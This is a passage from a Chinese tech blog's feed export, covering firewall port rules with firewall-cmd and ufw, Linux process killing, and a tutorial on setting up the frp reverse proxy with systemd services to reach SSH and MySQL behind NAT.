-ntlp</code></pre><blockquote><p>如果没有的话（<em>centos7默认没有 netstat 命令</em>），先安装<code>net-tools</code>。</p><pre class=" language-bash"><code class="language-bash">yum <span class="token function">install</span> -y net-tools</code></pre></blockquote><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># netstat -ntlp</span>Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      14301/mysqldtcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1840/sshdtcp6       0      0 :::6011                 :::*                    LISTEN      8037/sshd: root@ptstcp6       0      0 :::22                   :::*                    LISTEN      1840/sshd……</code></pre><p>其中<code>tcp</code>为ipv4，<code>tcp6</code>为ipv6.</p></blockquote><p>遇到过几次没有开放firewall端口时，只有<code>tcp6</code>而无<code>tcp</code>的情况，导致访问失败。放行端口后访问正常。</p><p>还遇到过只能从本地 127.0.0.1 或 localhost（实际上二者一样的，默认写在了host里）访问，通过（网卡的）IP地址无法访问的情况。表现在 Local Address 上是<code>127.0.0.1:xxxx</code>，通过修改该程序的网络设置把Address修改为对应的IP或 <code>0.0.0.0</code>，即可解决访问的问题。</p><hr><h4 id="以下操作之后都要执行-重载-或-重启-才能生效！！！"><a href="#以下操作之后都要执行-重载-或-重启-才能生效！！！" class="headerlink" title="以下操作之后都要执行 重载 或 重启 才能生效！！！"></a><strong>以下操作之后都要执行 重载 或 重启 才能生效</strong>！！！</h4><h4 id="开启特定端口"><a href="#开启特定端口" class="headerlink" title="开启特定端口"></a>开启特定端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>80/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span>systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><p>其中， 参数含义为<br><code>--zone</code> 作用域<br><code>--add-port=80/tcp</code>  添加端口，格式为：端口/通讯协议（<code>tcp</code>或<code>udp</code>）<br><code>--permanent</code>   永久生效，没有此参数重启后失效     </p><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --zone=public --add-port=80/tcp --permanent</span>success</code></pre><p>成功则返回 success</p></blockquote><h4 id="开放多个端口"><a href="#开放多个端口" class="headerlink" title="开放多个端口"></a>开放多个端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>8080-8083/tcp --permanentfirewall-cmd --reload   <span class="token comment" spellcheck="true"># 配置立即生效</span></code></pre><h4 id="关闭特定端口"><a href="#关闭特定端口" class="headerlink" title="关闭特定端口"></a>关闭特定端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --remove-port<span class="token operator">=</span>5672/tcp --permanent  <span class="token comment" spellcheck="true">#关闭5672端口</span>firewall-cmd --reload   <span class="token comment" spellcheck="true"># 配置立即生效</span><span class="token comment" spellcheck="true"># 也可以用restart</span></code></pre><h4 id="针对某个-IP-开放端口"><a href="#针对某个-IP-开放端口" class="headerlink" title="针对某个 IP 开放端口"></a>针对某个 IP 开放端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span>192.168.142.166<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span>6379<span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.0.233<span class="token string">" accept"</span></code></pre><h4 id="删除某个-IP"><a href="#删除某个-IP" class="headerlink" title="删除某个 IP"></a>删除某个 IP</h4><pre class=" language-bash"><code class="language-bash"> firewall-cmd --permanent --remove-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.1.51<span class="token string">" accept"</span></code></pre><h4 id="针对一个-IP-段访问"><a href="#针对一个-IP-段访问" class="headerlink" title="针对一个 IP 段访问"></a>针对一个 IP 段访问</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.0.0/16<span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span>192.168.1.0/24<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span>9200<span class="token string">" accept"</span></code></pre><br><hr><br><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>Ubuntu 系统默认提供了一个基于<code>iptables</code>之上的防火墙工具<code>ufw</code>。</p><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="安装ufw"><a href="#安装ufw" class="headerlink" title="安装ufw"></a>安装<code>ufw</code></h4><p>（默认已安装）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ufw</code></pre><h4 id="启用ufw，且在系统启动时自启"><a href="#启用ufw，且在系统启动时自启" class="headerlink" title="启用ufw，且在系统启动时自启"></a>启用<code>ufw</code>，且在系统启动时自启</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw <span class="token function">enable</span></code></pre><h4 id="关闭ufw"><a href="#关闭ufw" class="headerlink" title="关闭ufw"></a>关闭<code>ufw</code></h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw disable</code></pre><h4 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw status</code></pre><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>系统日志保存于<code>/var/log/ufw.log</code>。LEVEL指定不同的级别 ，默认级别是‘低’</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw logging on<span class="token operator">|</span>off  LEVEL   </code></pre><h3 id="端口相关"><a href="#端口相关" class="headerlink" title="端口相关"></a>端口相关</h3><h4 id="设置默认策略"><a href="#设置默认策略" class="headerlink" title="设置默认策略"></a>设置默认策略</h4><p>（比如 “mostly open” vs “mostly closed”）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw default allow  <span class="token comment" spellcheck="true"># 允许所有外部对本机的访问，且本机访问外部正常。</span><span class="token function">sudo</span> ufw default deny   <span class="token comment" spellcheck="true"># 关闭所有外部对本机的访问，但本机访问外部正常。</span></code></pre><h4 id="打开某个端口"><a href="#打开某个端口" class="headerlink" title="打开某个端口"></a>打开某个端口</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow smtp　   <span class="token comment" spellcheck="true"># 允许所有的外部IP访问本机的25/tcp （smtp）端口</span><span class="token function">sudo</span> ufw allow 22/tcp   <span class="token comment" spellcheck="true"># 允许所有的外部IP访问本机的22/tcp （ssh）端口</span><span class="token function">sudo</span> ufw allow 53       <span class="token comment" spellcheck="true"># 允许外部访问53端口（tcp/udp）</span><span class="token function">sudo</span> ufw allow from 192.168.1.100  <span class="token comment" spellcheck="true"># 允许此IP访问所有的本机端口</span><span class="token function">sudo</span> ufw allow proto udp 192.168.0.1 port 53 to 192.168.0.2 port 53<span class="token function">sudo</span> ufw allow <span class="token keyword">in</span> on eth0 from 192.168.0.0/16  <span class="token comment" spellcheck="true"># 允许来自192.168.0.0-192.168.255.255的数据通过eth0网卡进入主机</span><span class="token function">sudo</span> ufw allow out on eth1 to 10.0.0.0/8   <span class="token comment" spellcheck="true"># 允许指向10.0.0.0-10.255.255.255的数据通过eth1网卡从本机发出</span></code></pre><p>可以用<code>less /etc/services</code>列出所有服务信息，其中包括该服务使用了哪个端口和哪种协议</p><h4 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw deny smtp          <span class="token comment" spellcheck="true"># 禁止外部访问smtp服务</span><span class="token function">sudo</span> ufw delete allow smtp  <span class="token comment" spellcheck="true"># 删除上面建立的某条规则</span><span class="token function">sudo</span> ufw delete allow 80    <span class="token comment" spellcheck="true"># 禁止外部访问80端口</span><span class="token function">sudo</span> ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 25  <span class="token comment" spellcheck="true"># 拒绝来自10.0.0.0/8域tcp协议指向192.168.0.1端口25的数据进入本机</span></code></pre><h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw route allow <span class="token keyword">in</span> on eth1 out on eth2   <span class="token comment" spellcheck="true"># 允许经eth1进入，eth2发出的数据经本机路由</span></code></pre><hr><h2 id="进程相关命令"><a href="#进程相关命令" class="headerlink" title="进程相关命令"></a>进程相关命令</h2><h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ps 1</span>  PID TTY      STAT   TIME COMMAND    1 ?        Ss     7:25 /usr/lib/systemd/systemd --switched-root --system --deserialize 22</code></pre><h3 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">kill</span> -9 1234</code></pre><p>1234为对应的PID</p><blockquote><p>只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。    </p><p>下面是常用的信号：<br>HUP    1    终端断线<br>INT     2    中断（同 Ctrl + C）<br>QUIT    3    退出（同 Ctrl + \）<br>TERM   15    终止<br>KILL    9    强制终止<br>CONT   18    继续（与STOP相反， fg/bg命令）<br>STOP    19    暂停（同 Ctrl + Z）  </p></blockquote><p>或者 </p><p><strong>杀死指定名字的进程</strong>（kill processes by name），可以批量结束某个服务程序带有的全部进程。</p><ol><li>杀死所有同名进程   <pre class=" language-bash"><code class="language-bash"> <span class="token function">killall</span> nginx <span class="token function">killall</span> -9 <span class="token function">bash</span></code></pre></li><li>向进程发送指定信号   <pre class=" language-bash"><code class="language-bash"> <span class="token function">killall</span> -TERM ngixn  <span class="token comment" spellcheck="true"># 或者  killall -KILL nginx</span></code></pre></li></ol><blockquote><p>命令参数：</p><pre><code>-Z 只杀死拥有scontext 的进程-e 要求匹配进程名称-I 忽略小写-g 杀死进程组而不是进程-i 交互模式，杀死进程前先询问用户-l 列出所有的已知信号名称-q 不输出警告信息-s 发送指定的信号-v 报告信号是否成功发送-w 等待进程死亡--help 显示帮助信息--version 显示版本显示</code></pre></blockquote><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/zll_0405/article/details/81208606" target="_blank" rel="noopener">https://blog.csdn.net/zll_0405/article/details/81208606</a></p><p><a href="https://blog.csdn.net/bigdata_mining/article/details/80699180" target="_blank" rel="noopener">https://blog.csdn.net/bigdata_mining/article/details/80699180</a></p><p>etc.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> tips </tag>
            
            <tag> firewall </tag>
            
            <tag> 端口 </tag>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于frp实现内网穿透</title>
      <link href="/2020/01/29/Server_frp/"/>
      <url>/2020/01/29/Server_frp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前为了实现远程编程，折腾了一阵子<code>autossh</code>，利用反向代理把内网服务器的ssh映射到了公网端口，详见下面这篇。</p><blockquote><p><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">小想法 | 基于VSCode和ssh实现远程编程/炼丹</a></p></blockquote><p>这次需求扩大了一点，比如说想访问<strong>内网搭建的网站、数据库等等</strong>，但这些都<strong>不能直接在公网进行访问</strong>，<code>autossh</code>就有点不大给力了。</p><p>之前还了解过花生壳、ngrok这些，但是一般需要money要限速或者说不大友好，然后一想大家都在推荐<code>frp</code>，这回就来折腾一下吧！（主要是以后忘了还可以回来看嘻嘻</p><p>总体感受就是，<strong><code>frp</code>搭建起来比<code>autossh</code>方便多了</strong>呀！</p><br><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="What-is-frp"><a href="#What-is-frp" class="headerlink" title="What is frp?"></a>What is frp?</h3><blockquote><p><em>frp</em> is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports <strong>TCP</strong> and <strong>UDP</strong>, as well as <strong>HTTP</strong> and <strong>HTTPS</strong> protocols, where requests can be forwarded to internal services by domain name.</p><p><em>frp</em> also has a P2P connect mode.</p></blockquote><blockquote><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。</p></blockquote><p><img src="/2020/01/29/Server_frp/architecture.png" alt="architecture"></p><p>FRP，fast reverse proxy。使用 Go 语言开发，支持 Windows、Linux、macOS、ARM 等多平台部署。</p><p>其实简单地说也就是借助一台有公网IP的服务器作为中转，把内外网直接的流量连接起来。</p><p>其开源仓库：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><h3 id="What-should-I-prepare"><a href="#What-should-I-prepare" class="headerlink" title="What should I prepare?"></a>What should I prepare?</h3><p><strong>内网主机（客户端）：</strong>能上互联网（外网），或者说能连上你的公网服务器就行。（但没有公网IP）</p><p>可以是电脑（Windows，MacOS，Linux）/嵌入式设备（如树莓派）…对的，<strong>frp跨平台</strong>。</p><p><strong>公网主机（服务端）：</strong>有公网IP，或者绑定了域名能通过端口访问也行。</p><p>以及</p><p>想<strong>连接内网的你喜欢的设备</strong>。</p><br><hr><br><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>分为<strong>服务器端</strong>和<strong>客户端</strong>两部分。</p><h3 id="下载程序"><a href="#下载程序" class="headerlink" title="下载程序"></a>下载程序</h3><p>根据对应的操作系统及架构，从 <a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">Release</a> 页面下载最新版本的程序。</p><p>目前最新的版本是 <code>v0.31.1</code></p><p>比如Windows64位下载 <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_windows_amd64.zip" target="_blank" rel="noopener">frp_0.31.1_windows_amd64.zip</a>，</p><p>Linux64位一般是这个 <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz" target="_blank" rel="noopener">frp_0.31.1_linux_amd64.tar.gz</a>。</p><p>其他系统/架构的对应下载就好了。</p><p><img src="/2020/01/29/Server_frp/download.png" alt="下载对应的文件"></p><p>将 <strong>frps</strong> 及 <strong>frps.ini</strong> 放到具有公网 IP 的机器上。</p><p>将 <strong>frpc</strong> 及 <strong>frpc.ini</strong> 放到处于内网环境的机器上。</p><h3 id="服务器端的搭建"><a href="#服务器端的搭建" class="headerlink" title="服务器端的搭建"></a>服务器端的搭建</h3><p>可以在服务器上可以用wget下载。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> -p /etc/frp<span class="token function">cd</span> /etc/frp<span class="token function">sudo</span> <span class="token function">wget</span> <span class="token string">"https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz"</span><span class="token function">sudo</span> <span class="token function">tar</span> xzvf frp_0.31.1_linux_amd64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> frp_0.31.1_linux_amd64/* /etc/frp</code></pre><p>然而国内下载速度感人，大概8M的文件就几KB/s…</p><p>于是还不如直接搭个梯子到外面下载好了再传到服务器上。</p><p>服务器端server嘛，当然用的是 <strong>frps</strong> 及 <strong>frps.ini</strong>。</p><p>完整版的 <code>frps_full.ini</code>里面有很详细的注释，也可以用来参考。</p><br><p>最简单的<strong>配置</strong>就直接这样写</p><pre class=" language-ini"><code class="language-ini"># frps.ini<span class="token selector">[common]</span><span class="token constant">bind_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span></code></pre><p>然后<strong>启动<code>frps</code></strong>（Linux下）</p><pre class=" language-bash"><code class="language-bash">/etc/frp/frps -c /etc/frp/frps.ini</code></pre><p>再去把系统的<strong>防.火|墙打开</strong>，以及阿里云等平台的<strong>安全组规则设好允许入站出站</strong>。</p><blockquote><p>这个firewall搞死我了emmm折腾了老半天最后发现没放行端口……</p><p>后面再写一篇关于firewall配置的。</p></blockquote><p>好了，下面到客户端。</p><hr><h3 id="客户端（内网主机）的搭建"><a href="#客户端（内网主机）的搭建" class="headerlink" title="客户端（内网主机）的搭建"></a>客户端（内网主机）的搭建</h3><p>同理把<code>frp</code>解压的文件放到<code>/etc/frp</code>文件夹下。</p><p>客户端client，用的是 <strong>frpc</strong> 及 <strong>frpc.ini</strong>。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[common]</span><span class="token constant">server_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> x.x.x.x</span><span class="token constant">server_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span><span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7001</span><span class="token selector">[Mysql]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1   #也可以是局域网中的内网IP</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 3306</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7002</span></code></pre><p>其中common里的<code>server_addr</code>是公网主机的公网IP，<code>server_port</code>设成与服务端一样的端口。</p><p>每个方框<code>[.+]</code>里的是name，下面都对应着一个规则，要求不能重名。</p><p><code>type</code>可以是tcp/udp/http/https/stcp/xtcp（具体看官方文档），一般就tcp/http啦。</p><p><code>local_ip</code>和<code>local_port</code>为本地地址及端口。</p><p><code>remote_port</code>为公网的端口，这个可以在服务端进行限制，注意<strong>要在服务端放行这些端口</strong>啊！</p><br><p>客户端可以在多个主机上运行，只要name不重名就行。</p><p>而后<strong>启动客户端</strong></p><pre class=" language-bash"><code class="language-bash">/etc/frp/frpc -c /etc/frp/frpc.ini</code></pre><p>Windows下：</p><pre class=" language-bash"><code class="language-bash">frpc.exe -c frpc.ini</code></pre><p><img src="/2020/01/29/Server_frp/client.png" alt="client"></p><p><code>start proxy success</code>表示启动成功。</p><hr><h3 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h3><p>现在就可以直接通过公网IP的7001端口访问内网的ssh，通过7002端口访问内网的Mysql啦！</p><p><strong>远程编程，访问网页，管理数据库</strong>什么的都可以实现啦！</p><p><strong>好棒呀！</strong></p><br><hr><hr><br><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h3><p><code>frp</code>的<strong>服务器端</strong>提供了一个在web端<strong>查看运行状态</strong>的展示界面。</p><p>配置如下，在<code>common</code>中添加如下信息：</p><pre class=" language-ini"><code class="language-ini"># frps.ini<span class="token selector">[common]</span><span class="token constant">dashboard_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7500 # 注意开放端口</span># dashboard 用户名密码，默认都为 admin<span class="token constant">dashboard_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">dashboard_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>而后重启服务端，就可以在<code>http://[server_addr]:7500</code> 访问 dashboard 界面，用户名密码默认为 <code>admin</code>。</p><p><img src="/2020/01/29/Server_frp/Dashboard_Overview.png" alt="Dashboard_Overview"></p><p><img src="/2020/01/29/Server_frp/Dashboard_Proxies.png" alt="Dashboard_Proxies"></p><p>还别说，挺好看的唉！</p><p>看了一下，基于<code>vue</code>写的。</p><hr><h3 id="Admin-UI"><a href="#Admin-UI" class="headerlink" title="Admin UI"></a>Admin UI</h3><p>在客户端也提供了一个类似于dashboard的查看状态和管理配置的界面。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[common]</span><span class="token constant">admin_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">admin_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7400</span><span class="token constant">admin_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">admin_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>然后本地就可以通过 <a href="http://127.0.0.1:7400" target="_blank" rel="noopener">http://127.0.0.1:7400</a> 来访问<strong>查看状态</strong>和<strong>修改配置</strong>了。</p><p>这里如果想通过内网IP（如<code>192.168.1.66</code>）查看的话，需要把<code>admin_addr</code>修改为 <code>0.0.0.0</code>（允许所有访问），或者对应的本地IP（如<code>192.168.1.66</code>）。</p><p>同时也需要在本地的firewall打开这个端口，否则在内网的其他主机也无法访问。（折腾了老半天才发现emmm</p><p>当然，想要在公网访问的话，把7400端口映射到外网就好了，不过安全起见算了吧。</p><p><img src="/2020/01/29/Server_frp/AdminUI.png" alt="AdminUI"></p><hr><h3 id="开启加密、压缩"><a href="#开启加密、压缩" class="headerlink" title="开启加密、压缩"></a>开启加密、压缩</h3><p>在客户端加入<code>use_encryption</code> 和 <code>use_compression</code>这两个参数。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 6000</span><span class="token constant">use_encryption</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span><span class="token constant">use_compression</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span></code></pre><hr><h3 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h3><p>这次直接把<code>frp</code>作为一个service好了，用<code>systemd</code>好了！</p><h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><p>新建一个文件，名叫 <code>frps.service</code>，写入</p><pre class=" language-ini"><code class="language-ini"># frps.service<span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Server</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frps -c /etc/frp/frps.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frps</span>#启动失败1分钟后再次启动<span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span>#重启控制：总是重启<span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><p><code>frpc.service</code></p><pre class=" language-ini"><code class="language-ini"># frpc.service<span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Client</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frpc -c /etc/frp/frpc.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frpc</span>#启动失败1分钟后再次启动<span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span>#重启控制：总是重启<span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><p>而后将此文件放到 服务器端和客户端的<strong><code>/etc/systemd/system/</code> 目录</strong>下。</p><p>先<code>killall frps</code>（或frpc），再调用</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> frps.service</code></pre><p>或</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> frpc.service</code></pre><p>这样就成功配置了开机自启。</p><p>而且可以通过下列命令进行管理：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start frpc.service    <span class="token comment" spellcheck="true"># 启动</span><span class="token function">sudo</span> systemctl stop frpc.service     <span class="token comment" spellcheck="true"># 停止</span><span class="token function">sudo</span> systemctl restart frpc.service  <span class="token comment" spellcheck="true"># 重启</span><span class="token function">sudo</span> systemctl status frpc.service   <span class="token comment" spellcheck="true"># 查看状态</span></code></pre><p>frps同理。</p><p><img src="/2020/01/29/Server_frp/service.png" alt="查看状态"></p><br><hr><hr><br><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>frp很强大的呢！</p><p>比如还可以在一定情况下绕过服务器实现点对点P2P连接，不过前提是内网和你的设备两端都要装frpc客户端。</p><p>更多且看<strong>官方文档</strong>：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><p>关键这个<strong>配置起来贼方便啊</strong>！</p><p>于是这样就可以通过公网IP，访问到你内网的资源啦，嘻嘻嘻~</p><p>好了，完事！</p><p>溜了溜了。</p><hr><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>官方仓库及介绍 <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></li><li>官方中文文档 <a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/fatedier/frp/blob/master/README_zh.md</a></li><li><a href="https://www.iplaysoft.com/frp.html" target="_blank" rel="noopener">https://www.iplaysoft.com/frp.html</a></li><li>Frp后台自动启动的几个方法 <a href="https://blog.csdn.net/x7418520/article/details/81077652" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81077652</a></li><li>Systemd 服务管理教程 <a href="https://cloud.tencent.com/developer/article/1516125" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516125</a></li><li><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">小想法 | 基于VSCode和ssh实现远程编程/炼丹</a></li></ol><p>还看到过一个免费的内网穿透服务，Sakura Frp <a href="https://www.natfrp.com/" target="_blank" rel="noopener">https://www.natfrp.com/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Server </tag>
            
            <tag> 穿透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020鼠年快乐！来玩红包闯关吧！</title>
      <link href="/2020/01/25/CTF_2020HappyChineseNewYear/"/>
      <url>/2020/01/25/CTF_2020HappyChineseNewYear/</url>
      
